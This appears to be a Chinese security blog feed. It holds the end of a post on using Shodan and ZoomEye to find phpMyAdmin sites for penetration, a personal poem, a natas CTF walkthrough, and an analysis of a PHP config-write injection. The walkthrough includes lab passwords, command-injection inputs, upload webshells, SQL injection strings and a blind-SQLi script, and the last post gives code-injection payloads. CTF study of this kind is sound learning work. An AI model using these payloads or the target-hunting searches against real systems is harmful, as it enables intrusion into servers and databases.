<h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><p>　　Shodan被称为“世界上最可怕的搜索引擎”，Shodan通过来自各种设备的HTTP header以及其它标志性信息进行检索。Shodan可以收集这些设备的信息，并根据其所属国家、操作系统、品牌以及许多其它属性进行分类。而谷歌、百度等搜索引擎通过引用返回的内容进行检索，是网站内容搜索。我们可以注册账号进行搜索，进行免费的使用，Shodan搜索方法比较简单，大家可以自行尝试。</p>
<ul>
<li>1.1　关键字搜索<br>　　搜索方法比较简单，直接在搜索框输入“phpmyadmin”，系统就会自动进行搜索。<br><img src="http://i2.muimg.com/567571/59d4db78a9c1d2c3.jpg" alt=""></li>
<li>1.2  多关键词搜索<br>　　在shodan搜索引擎中默认按照“TOP COUNTRIES”、“TOP SERVICES”、“TOP ORGANIZATIONS”、“TOP OPERATINGSYSTEMS”和“TOP PRODUCTS”五种类型进行显示，免费用户只能搜索前五页结果。不登录的话，只能看到一些简单的结果。<br>　　我们可以在搜索关键字中加入国家进行搜索，也可以在左边的地图上进行点选。例如以下关键字：phpMyAdmin country:”CN” product:”Apache httpd” 表示搜索关键字“phpMyAdmin”，国家为中国，产品类型为“Apachehttpd”。<br><img src="http://i4.buimg.com/567571/d7ee38017c3b1c06.jpg" alt=""></li>
<li>1.3 搜索结果<br>　　搜索结果记录中可以看到每一个记录中都会包含“phpMyAdmin”，然后在下面有一个Details，单击该链接会显示有关该IP端口开放等详细信息，在该信息中默认还会以地图方式显示该IP可能的地理信息。<br><img src="http://i2.muimg.com/567571/5f19d114bc2f7dea.jpg" alt=""></li>
</ul>
<h4 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h4><p>　　Zoomeye是知道创宇开放了他们的海量数据库，对之前沉淀的数据进行了整合、整理，打造了一个名符其实的网络空间搜索引擎，除了联网设备还可搜索网站组件，可以用来对web服务进行细节分析。</p>
<ul>
<li>1.1 普通搜索<br>　　直接主页面输入我们想要搜索的内容。<br><img src="http://i1.piimg.com/567571/6bb246ec33882fdd.jpg" alt=""></li>
<li>1.2 高级搜索<br>　　比如discuz的一个古老的漏洞，discuz X1.5版本，存在sql注入，可以利用sql注入上传文件，最终拿下服务器。<br><img src="http://i1.piimg.com/567571/64fe0c937f2f30ba.jpg" alt=""></li>
</ul>
<p>　　经过上面两个搜索引擎，我们可以找到一系列存在phpmyadmin的网站。</p>
<h3 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h3><p>　　经过上面的几步，我们已经得到了我们的目标，那么就可以进行下面的渗透操作了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-PhpMyadmin&quot;&gt;&lt;a href=&quot;#0x01-PhpMyadmin&quot; class=&quot;headerlink&quot; title=&quot;0x01 PhpMyadmin&quot;&gt;&lt;/a&gt;0x01 PhpMyadmin&lt;/h3&gt;&lt;p&gt;　　Phpmyadmin是一款以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，通过提供的mysql数据库用户账号和密码对所管理的数据库实施操作。在渗透过程中，一旦获取其mysql账号和对应的密码，轻者获取其账号所管理数据库，重者可以配合其它漏洞获取webshell权限和系统权限。&lt;/p&gt;
&lt;h3 id=&quot;0x02-PhpMyadmin各版本漏洞&quot;&gt;&lt;a href=&quot;#0x02-PhpMyadmin各版本漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x02 PhpMyadmin各版本漏洞&quot;&gt;&lt;/a&gt;0x02 PhpMyadmin各版本漏洞&lt;/h3&gt;&lt;p&gt;一、影响版本：3.5.x &amp;lt; 3.5.8.1 and 4.0.0 &amp;lt; 4.0.0-rc3 ANYUN.ORG
    
    </summary>
    
      <category term="测试" scheme="http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>时光不老 我们不散</title>
    <link href="http://yoursite.com/%E7%94%9F%E6%B4%BB/2017/03/31/%E6%97%B6%E5%85%89%E4%B8%8D%E8%80%81-%E6%88%91%E4%BB%AC%E4%B8%8D%E6%95%A3.html"/>
    <id>http://yoursite.com/生活/2017/03/31/时光不老-我们不散.html</id>
    <published>2017-03-31T07:42:30.000Z</published>
    <updated>2017-04-10T02:17:12.782Z</updated>
    
    <content type="html"><![CDATA[<h3 id="时光不老，我们不散；岁月不逝，我们不弃"><a href="#时光不老，我们不散；岁月不逝，我们不弃" class="headerlink" title="时光不老，我们不散；岁月不逝，我们不弃"></a>时光不老，我们不散；岁月不逝，我们不弃</h3><p>　　天空不知何时划过一颗颗流星，<br>　　飞向同一个星球，<br>　　宛如我们来自不同的城市，<a id="more"></a><br>　　但却相聚在这小小的房子里。<br>　　生命是个漫长又遥远的过程，<br>　　经历着陌生和熟悉，冷漠和温暖。<br>　　时光消磨着岁月的痕迹，<br>　　追着青春的步伐，<br>　　我们哼着歌回忆往昔;<br>　　我们读着书品味诗意;<br>　　我们说着笑讲述自己;<br>　　我们谈着天细数日子。</p>
<p><img src="http://i2.muimg.com/567571/5fcda118895c7351.jpg" alt=""></p>
<p>　　梦里花开，清风飘过，<br>　　桌上的书页正谱写动人的旋律。<br>　　白色的墙是你我最坚实的港湾，<br>　　小小的房子里住着我们的记忆，<br>　　灯光的照明，<br>　　你牵着我的手，<br>　　陪我走过无数个日日夜夜，<br>　　陪我穿梭于春夏秋冬，<br>　　陪我走过生命的旅程。<br>　　又是花开的季节，<br>　　到处都是风车在转，<br>　　记得那个时候，<br>　　你说日子好长，<br>　　你说青春不变梦想满星辰，<br>　　你说记忆犹存沧海桑田，<br>　　你说时光不老我们不散，<br>　　其实那年，<br>　　我们追着风筝奔跑的时候，<br>　　时光就早已悄悄溜走。<br>　　阳光下，<br>　　一行人一排影子，<br>　　还有一串相伴的小脚丫。</p>
<p>那些曾经一起奋斗的你们现在过得怎么样了？时光不散，我们不老</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;时光不老，我们不散；岁月不逝，我们不弃&quot;&gt;&lt;a href=&quot;#时光不老，我们不散；岁月不逝，我们不弃&quot; class=&quot;headerlink&quot; title=&quot;时光不老，我们不散；岁月不逝，我们不弃&quot;&gt;&lt;/a&gt;时光不老，我们不散；岁月不逝，我们不弃&lt;/h3&gt;&lt;p&gt;　　天空不知何时划过一颗颗流星，&lt;br&gt;　　飞向同一个星球，&lt;br&gt;　　宛如我们来自不同的城市，
    
    </summary>
    
      <category term="生活" scheme="http://yoursite.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="杂谈" scheme="http://yoursite.com/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>natas通关手册</title>
    <link href="http://yoursite.com/CTF/2017/03/18/natas%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C.html"/>
    <id>http://yoursite.com/CTF/2017/03/18/natas通关手册.html</id>
    <published>2017-03-18T09:12:44.000Z</published>
    <updated>2017-04-02T07:29:10.401Z</updated>
    
    <content type="html"><![CDATA[<p>前几天看博客发现了一个很不错的网站，natas overthewire是一个和web安全相关的CTF网站，题目设计的还是很精巧的，很值得我们这些学习web安全的做一做。<br>地址：<a href="http://overthewire.org/wargames/natas/" target="_blank" rel="external">http://overthewire.org/wargames/natas/</a></p>
<p><strong>level 0</strong><br>直接查看源代码，即可从注释中看到密码；<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</div></pre></td></tr></table></figure></p>
<p><strong>level 1</strong><br>登录进去发现禁止右键，但是可以F12进行审查元素或者查看源代码快捷方式<strong><em>Ctrl+U</em></strong>，密码还是在注释里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</div></pre></td></tr></table></figure></p>
<p><strong>level 2</strong><br>查看源代码什么也没有发现，就发现有一张图片，想想看看能不能查看files这个目录，结果files目录没有禁止访问，发现files目录下有一个uesrs.txt，打开就有密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</div></pre></td></tr></table></figure></p>
<p><strong>level 3</strong><br>也是第一反应查看原代码，可是并没有提示。注意这里，Not even google will find it ，说明搜索引擎不会抓取这个相关的页面，说明存在robots.txt。访问之<a href="http://natas3.natas.labs.overthewire.org/robots.txt发现一个s3cr3t的目录打开发现一个users.txt" target="_blank" rel="external">http://natas3.natas.labs.overthewire.org/robots.txt发现一个s3cr3t的目录打开发现一个users.txt</a> 得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</div></pre></td></tr></table></figure></p>
<p><strong>level 4</strong><br>页面提示<strong><em>You are visiting from “<a href="http://natas4.natas.labs.overthewire.org/index.php" target="_blank" rel="external">http://natas4.natas.labs.overthewire.org/index.php</a>“ while authorized users should come only from “<a href="http://natas5.natas.labs.overthewire.org/" target="_blank" rel="external">http://natas5.natas.labs.overthewire.org/</a>“ </em></strong>，需要我们从natas5页面来访问natas4的页面，我们可以使用burp抓包，增加一个Referer头来指定当前页面来自哪里，即可得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</div></pre></td></tr></table></figure></p>
<p><strong>level 5</strong><br>发现是一个登录界面，但是提示你没有登录，可以burp抓包进行查看。一般登录验证身份或者状态都是通过cookie，发现cookie参数的一个loggedin的值为0.试着改为1试试看，提示登录成功，得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div></pre></td></tr></table></figure></p>
<p><strong>level 6</strong><br>登录发现是一个post提交的地方，还可以查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line"></div><div class="line">include &quot;includes/secret.inc&quot;;</div><div class="line"></div><div class="line">    if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</div><div class="line">        if($secret == $_POST[&apos;secret&apos;]) &#123;</div><div class="line">        print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">        print &quot;Wrong secret&quot;;</div><div class="line">    &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>大体就是提交一个数字与include文件里的内容进行对比。尝试访问includes/secret.inc，竟然明晃晃的$secret = “FOEIUWGHFEEUHOFUOIU”;，那么直接输入进去就可以得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</div></pre></td></tr></table></figure></p>
<p><strong>level 7</strong><br>登录进去就两个没有什么内容的链接，但是链接很有意思?page=home和?page=home，还有提示<strong><em>hint: password for webuser natas8 is in /etc/natas_webpass/natas8</em></strong>，那肯定就是目录遍历咯，?page=/etc/natas_webpass/natas8，得到密码；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</div></pre></td></tr></table></figure></p>
<p><strong>level 8</strong><br>登录进去发现又是一个post提交的表单，查看关键代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line"></div><div class="line">$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;</div><div class="line"></div><div class="line">function encodeSecret($secret) &#123;</div><div class="line">    return bin2hex(strrev(base64_encode($secret)));</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</div><div class="line">    if(encodeSecret($_POST[&apos;secret&apos;]) == $encodedSecret) &#123;</div><div class="line">    print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">    print &quot;Wrong secret&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>bin2hex函数 将二进制数据转换成十六进制表示<br>strrev() 函数反转字符串<br>已经告诉了我们encodedSecret的值，以及加密方式已经给出，我们可以到着密码方式来，这样可以得到我们需要输入的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo base64_decode(strrev(hex2bin(&quot;3d3d516343746d4d6d6c315669563362&quot;)));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>得到oubWYf2kBq，输入直接得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</div></pre></td></tr></table></figure></p>
<p><strong>level 9</strong><br>登录发现又是一个输入框，查看关键代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">$key = &quot;&quot;;</div><div class="line"></div><div class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</div><div class="line">    $key = $_REQUEST[&quot;needle&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($key != &quot;&quot;) &#123;</div><div class="line">    passthru(&quot;grep -i $key dictionary.txt&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>发现passthru()函数，它同exec()函数system()函数类似, 也是用来执行外部命令(command)的。提交的参数作为$key执行grep -i $key dictionary.txt命令，想到肯定是命令执行漏洞了。<br>首先就是截断grep命令，可是使用;进行截断，然后根据前面目录遍历的思路查看/etc/natas_webpass/natas9文件，即输入;cat /etc/natas_webpass/natas10 #，得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</div></pre></td></tr></table></figure></p>
<p><strong>level 10</strong><br>和上一个题目差不多，但就是过滤了; | &amp; 三个符号，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">$key = &quot;&quot;;</div><div class="line"></div><div class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</div><div class="line">    $key = $_REQUEST[&quot;needle&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($key != &quot;&quot;) &#123;</div><div class="line">    if(preg_match(&apos;/[;|&amp;]/&apos;,$key)) &#123;</div><div class="line">        print &quot;Input contains an illegal character!&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">        passthru(&quot;grep -i $key dictionary.txt&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>不能够截断grep了，只能使用grep进行搜索了，根据前面做的题目一直密码都是大小写，我们可以搜索大小字母得到密码，即输入[a-zA-Z] /etc/natas_webpass/natas11 #或者匹配所有.*  /etc/natas_webpass/natas11 #，得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</div></pre></td></tr></table></figure></p>
<p><strong>level 11</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</div></pre></td></tr></table></figure></p>
<p><strong>level 12</strong><br>登录发现是一道文件上传类型的题目，查看源代码，发现并未设置文件类型检测，上传后还会告诉我们路径，那么直接上传一个php文件，然后根据路径访问得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    passthru(&apos;cat /etc/natas_webpass/natas13&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>刚开始的时候一直被重命名为jpg，一直很懵逼，然后抓包发现参数k24yezk2tm.jpg，就试着修改为k24yezk2tm.php，则上传上去的就会重名为.php文件。<br><img src="http://p1.bpimg.com/567571/2267a96ab65a6d24.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</div></pre></td></tr></table></figure>
<p><strong>level 13</strong><br>登录可以看到使用exif_imagetype()来读取文件的第一个字节并检查其签名，判断是否为图像类型说明。<br>那么我们可以在php文件前面添加上jpg图像的前几个字节用来逃避exif_imagetype()函数的验证。其他过程和第一步类似。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GIF89a</div><div class="line">&lt;?php  </div><div class="line">    passthru(&apos;cat /etc/natas_webpass/natas14&apos;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</div></pre></td></tr></table></figure></p>
<p><strong>level 14</strong><br>登录进去是一个登录界面，第一反应就是试试常见的登录名、密码等弱口令，第二个就是万能密码，第三就是进行注入了，登录名随便，密码为<strong><em>” OR 1=1 #</em></strong>，即可登录成功拿到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</div></pre></td></tr></table></figure></p>
<p><strong>level 15</strong><br>登录进去也是一个登录的界面，随便输入都是一样的错误提示，当我们输入natas16的时候它会提示用户存在，只给了一个能够判断用户是否存在的东西因此只有通过爆破来攻击。可能我们下一关的用户名和密码存储在数据库中，可以通过错误的提示来判断查询的结果，得出密码。采用sql盲注的技术。<br>查看源代码查询语句为<strong><em>$query = “SELECT </em> from users where username=\””.$_REQUEST[“username”].”\””;*</strong>，我们可以构造查询password的语句，通过查询的结果盲注出密码。即输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * from users where username=\&quot;natas16\&quot; and 32 &lt; ascii(mid(password,1,1)) and \&quot;\&quot; like \&quot;\&quot;</div></pre></td></tr></table></figure></p>
<p>sql盲注脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"></div><div class="line">import requests</div><div class="line">url = &apos;http://natas15.natas.labs.overthewire.org/index.php&apos;</div><div class="line">username = &apos;natas15&apos;</div><div class="line">password = &apos;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&apos;</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pwd in range(34):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (low+high)&gt;&gt;1  #使用二分法快速查找   </div><div class="line">    </div><div class="line">    while mid&lt;high:</div><div class="line">        #构造查询password来进行匹配</div><div class="line">        payload=&quot; natas16\&quot; and %d &lt; ascii(mid(password,%d,1)) and \&quot;\&quot; like \&quot;&quot; %(mid,pwd)</div><div class="line">        req = requests.post(url, auth = requests.auth.HTTPBasicAuth(username,password),data=&#123;&quot;username&quot;:payload&#125;)</div><div class="line">        #对返回结果进行判断 </div><div class="line">        if req.text.find(&quot;doesn&apos;t exist&quot;)==-1: </div><div class="line">            low = mid+1</div><div class="line">        else:</div><div class="line">            high=mid   </div><div class="line">        mid = (high+low)&gt;&gt;1  #继续二分进行查找</div><div class="line">        </div><div class="line">    key+=chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure></p>
<p>这样就会根据盲注脚本找到密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</div></pre></td></tr></table></figure></p>
<p><strong>level 16</strong></p>
<p><strong>level 17</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天看博客发现了一个很不错的网站，natas overthewire是一个和web安全相关的CTF网站，题目设计的还是很精巧的，很值得我们这些学习web安全的做一做。&lt;br&gt;地址：&lt;a href=&quot;http://overthewire.org/wargames/natas/&quot;&gt;http://overthewire.org/wargames/natas/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;level 0&lt;/strong&gt;&lt;br&gt;直接查看源代码，即可从注释中看到密码；
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>php正则的经典漏洞</title>
    <link href="http://yoursite.com/%E4%BB%A3%E7%A0%81/2017/03/16/php%E6%AD%A3%E5%88%99%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E.html"/>
    <id>http://yoursite.com/代码/2017/03/16/php正则的经典漏洞.html</id>
    <published>2017-03-16T08:57:01.000Z</published>
    <updated>2017-04-02T07:29:28.717Z</updated>
    
    <content type="html"><![CDATA[<p>p师傅前几天的小密圈的一个问题，这是一个经典的配置文件写入问题漏洞:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(!isset($_GET[&apos;option&apos;])) die();</div><div class="line">$str = addslashes($_GET[&apos;option&apos;]);</div><div class="line">$file = file_get_contents(&apos;./config.php&apos;);</div><div class="line">$file = preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;, &quot;\$option=&apos;$str&apos;;&quot;, $file);</div><div class="line">file_put_contents(&apos;./config.php&apos;, $file);</div></pre></td></tr></table></figure>
<p>config.php的内容：<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;test&apos;;</div></pre></td></tr></table></figure></p>
<p>要求是getshell，这个场景十分的经典，经常用在修改配置文件写入的时候。</p>
<p>首先说说这几个函数：<br><strong>1、addslashes()</strong><br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<pre><code>预定义字符是：
单引号（&apos;）
双引号（&quot;）
反斜杠（\）
NULL
</code></pre><p><strong>注释：</strong>默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p>
<p><strong>2、file_get_contents()</strong><br>file_get_contents() 把整个文件读入一个字符串中。<br>file_get_contents(path,include_path,context,start,max_length) </p>
<p><strong>3、preg_replace()</strong><br>preg_replace(),执行一个正则表达式的搜索和替换</p>
<p><strong>4、file_put_contents</strong><br>file_put_contents() 函数把一个字符串写入文件中。<br>file_put_contents(file,data,mode,context)</p>
<h3 id="0x01-利用反斜线"><a href="#0x01-利用反斜线" class="headerlink" title="0x01 利用反斜线"></a>0x01 利用反斜线</h3><p>输入：\’;phpinfo();//<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=\&apos;;phpinfo();//</div></pre></td></tr></table></figure></p>
<p>则config.php文件修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;\\&apos;;phpinfo();//&apos;;</div></pre></td></tr></table></figure></p>
<p>\’经过addslashes()之后变为\\’，随后preg_replace会将两个连续的\合并为一个，也就是将\\’转为\‘，这样我们就成功引入了一个单引号，闭合上文注释下文，中间加入要执行的代码即可。<br>看来是preg_replace函数特性。经测试，该函数会针对反斜线进行转义，即成对出现的两个反斜线合并为一个。<br>这是xdebug分析的跳转：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0006     333912   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">    0.0008     333944     -&gt; addslashes(&apos;\\\&apos;;phpinfo();//&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                           &gt;=&gt; &apos;\\\\\\\&apos;;phpinfo();//&apos;</div><div class="line">                           =&gt; $str = &apos;\\\\\\\&apos;;phpinfo();//&apos; D:\phpstudy\www\index.php:3</div><div class="line">    0.0010     334120     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">    0.0015     334544     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;\\\\\\\&apos;;phpinfo();//\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">    0.0016     334496     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                           &gt;=&gt; 35</div><div class="line">                         &gt;=&gt; 1</div><div class="line">    0.0055 zu</div></pre></td></tr></table></figure></p>
<h3 id="0x02-利用正则匹配缺陷和换行符-0a"><a href="#0x02-利用正则匹配缺陷和换行符-0a" class="headerlink" title="0x02 利用正则匹配缺陷和换行符%0a"></a>0x02 利用正则匹配缺陷和换行符%0a</h3><p>分两次进行请求：<br><strong>1、第一次传入aaa’;phpinfo();%0a//,</strong>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=aaa&apos;;phpinfo();%0a//</div></pre></td></tr></table></figure></p>
<p>此时config.php文件变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;aaa\&apos;;phpinfo();</div><div class="line">//&apos;;</div></pre></td></tr></table></figure></p>
